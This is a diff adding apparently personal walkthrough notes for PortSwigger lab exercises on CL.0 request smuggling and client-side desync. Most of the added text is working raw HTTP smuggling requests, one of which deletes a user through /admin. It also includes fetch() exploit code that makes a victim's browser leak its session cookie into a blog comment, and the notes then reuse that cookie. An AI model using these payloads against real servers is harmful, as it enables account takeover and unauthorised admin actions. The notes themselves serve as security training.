@@ -4605,9 +4605,121 @@ Response: Communication timed out. (chunked size is 5)
   - The content-length of home page is 8696. Add in enough arbitrary characters after </script> and resend the request > alert prompt
     command prompt > python > print('A' * 9000)
   - Resend by removing the "?cachebuster=3"
-- dd
-- dd 
-- dd
+- CL.0 request smuggling 
+  - Info: This lab is vulnerable to CL.0 request smuggling attacks. The **back-end server ignores the Content-Length header on requests to some endpoints**. To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.
+  - https://www.youtube.com/watch?v=9zgDC5j58p8
+  - Request 1: GET /resources/images/blog.svg > repeater > change request method to POST > change to HTTP 1.1 > remove "update content-length" > remove extra http request header (left host, content-type, content-length) > add an arbitrary request smuggle  
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: CORRECT
+
+    GET /hopefully404 HTTP/1.1
+    Foo: x
+    ```
+  - Reques 2: GET / > repeater > change to HTTP 1.1
+    ```
+    POST /resources/images/blog.svg HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Connection: keep-alive
+    Content-Length: CORRECT
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Foo: x
+    ```
+ - Send group in sequence (single connection)
+ - If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests > HTTP/1.1 404 Not Found
+ - Use static file to cause a CL.0 desync and delete carlos > resend under normal request untill 302 response
+   ```
+   POST /resources/images/blog.svg HTTP/1.1
+   Host: YOUR-LAB-ID.web-security-academy.net
+   Cookie: session=YOUR-SESSION-COOKIE
+   Connection: keep-alive
+   Content-Length: CORRECT
+
+   GET /admin/delete?username=carlos HTTP/1.1
+   Foo: x
+   ```
+- Client-side desync (Expert)
+  - Info: This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.
+  - Identify a vulnerable endpoint  > GET / > repeater > change to POST method > disable "udpate content-length" > change the content-length to 1 or higher, but leave the body empty > observer that the server responds immediately and suggested that it is ignoring the specified "content-length"
+  - Identify a client-side desync vector in Burp > 2nd request get 404 not found
+    Request 1: > Enabled HTTP/1 connection reuse + Enable "update content-length"
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Connection: close
+    Content-Length: CORRECT
+
+    GET /hopefully404 HTTP/1.1
+    Foo: x
+    ```
+
+    Request 2: send normal GET / request
+
+    Send group (single connection)
+  - Replicate the desync vector in your browser then confirm that you can replicate this in your browser. > new browser > under network tab > check "preserve log" > under console log > send below script > 
+    Under network tab, observerd that First response triggered a CORS error and get 302, 2nd response 404 not found
+    ```
+    fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+    credentials: 'include',
+	}).catch(() => {
+	        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+	        mode: 'no-cors',
+	        credentials: 'include'
+	    })
+	})
+    ```
+  - Identify a gadget that enables you to store text data within the application.
+    Request 1
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Connection: keep-alive
+    Content-Length: CORRECT
+
+    POST /en/post/comment HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE
+    Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
+    Content-Type: x-www-form-urlencoded
+    Connection: keep-alive
+
+    csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=
+    ```
+
+    Request 2
+    ```
+    GET /capture-me HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    ```
+  - Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
+    Exploit server: Bodt > store > deliver to victim (adjsut the content-length)
+    ```
+    fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+        method: 'POST',
+	        body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
+	        mode: 'cors',
+	        credentials: 'include',
+	    }).catch(() => {
+	        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
+	        mode: 'no-cors',
+	        credentials: 'include'
+	    })
+	})
+    ```    
+  - Use the stolen cookie to access the victim's account. Refresh the blog blog and confirm that you have captured the start of the victim user's request. Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim's session cookie.
+    ```
+    GET /myaccount
+    cookie: <stolen cookie>
+    ```
 - dd
 - dd
 
